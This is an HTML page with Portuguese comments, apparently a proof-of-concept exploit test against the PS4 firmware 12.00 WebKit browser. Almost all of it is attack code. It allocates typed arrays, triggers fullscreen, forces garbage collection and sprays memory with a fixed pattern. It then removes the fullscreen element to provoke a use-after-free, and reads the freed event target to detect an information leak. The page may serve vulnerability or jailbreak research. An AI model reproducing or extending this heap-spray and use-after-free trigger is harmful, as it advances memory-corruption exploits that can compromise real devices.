
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Info Leak Event Trapper</title>
<style>
    body { background-color: #111; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px;}
    #log { margin-top: 20px; white-space: pre-wrap; }
    .leak { color: #ff00ff; font-weight: bold; font-size: 20px;}
</style>
</head>
<body>

<h2>PS4 12.00 - Info Leak via Event Trap</h2>
<button onclick="runTest()" style="padding: 15px; cursor: pointer; background: #333; color: #0f0; border: 1px solid #0f0;">Iniciar Interceptação</button>
<div id="log">Aguardando...</div>

<script>
// Padrão 0x2222222222222222 (Mais seguro para tentar ler sem causar segfault imediato)
const PATTERN = 1.1125369292536e-308; 

// Listener global para tentar capturar o objeto "Zumbi" durante a transição
document.addEventListener('webkitfullscreenchange', (event) => {
    let log = document.getElementById("log");
    log.innerHTML += "<br><span style='color: yellow;'>[*] Evento webkitfullscreenchange INTERCEPTADO!</span>";
    
    try {
        // O C++ tenta nos dizer quem disparou o evento. É aqui que o leak ocorre!
        let alvoZumbi = event.target;
        let fsAtual = document.webkitFullscreenElement;
        
        log.innerHTML += `<br>[*] Tag do alvo do evento: ${alvoZumbi ? alvoZumbi.tagName : 'null'}`;
        
        if (alvoZumbi && alvoZumbi.tagName !== 'DIV') {
            log.innerHTML += `<br><span class="leak">[!!!] LEAK DE TIPO! TagName corrompido: ${alvoZumbi.tagName}</span>`;
        }

        if (alvoZumbi) {
            // Tenta ler propriedades internas que podem estar lendo o nosso Spray (0x22222222)
            let larguraLeak = alvoZumbi.clientWidth;
            log.innerHTML += `<br>[*] clientWidth do alvo: ${larguraLeak}`;
            
            if (larguraLeak > 10000) {
                log.innerHTML += `<br><span class="leak">[!!!] INFO LEAK GEOMÉTRICO CONFIRMADO: ${larguraLeak}</span>`;
            }
        }
    } catch(e) {
        // Às vezes o motor C++ lança uma exceção com partes da memória vazada na string de erro
        log.innerHTML += `<br><span class="leak">[!] Exceção capturada no evento: ${e.message}</span>`;
    }
});

function runTest() {
    const log = document.getElementById("log");
    log.innerHTML = "Preparando alocações...<br><b>Pressione OPTIONS agora!</b>";

    let controllers = [];

    // [1] Alocação
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='color: white; margin-top: 20%; text-align: center;'>Trap Ativada<br>Aperte OPTIONS</h1>";
    fsTarget.style.cssText = "background:black; width:100%; height:100%; position:absolute; top:0; left:0;";
    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    window.onblur = function() {
        log.innerHTML += "<br>[*] Onblur. Forçando GC e Spray...";

        // [2] GC
        controllers = null;
        for (let i = 0; i < 20000; i++) {
            new ArrayBuffer(0x10000);
        }

        // [3] Spray Envenenado
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }

        // [4] Gatilho Cirúrgico
        setTimeout(() => {
            log.innerHTML += "<br>[*] Acionando Gatilho (Remove -> Exit -> Reload)...";
            try {
                fsTarget.remove(); 
                
                if (document.webkitIsFullScreen || document.fullscreenElement) {
                    document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
                }
            } catch(e) {
                log.innerHTML += "<br>[Erro] " + e;
            }

            // Aumentei o tempo do reload para 1000ms para dar tempo de lermos os logs do Event Listener antes do crash/reload
            setTimeout(() => location.reload(), 1000);
        }, 3000);
    };
}
</script>

</body>
</html>
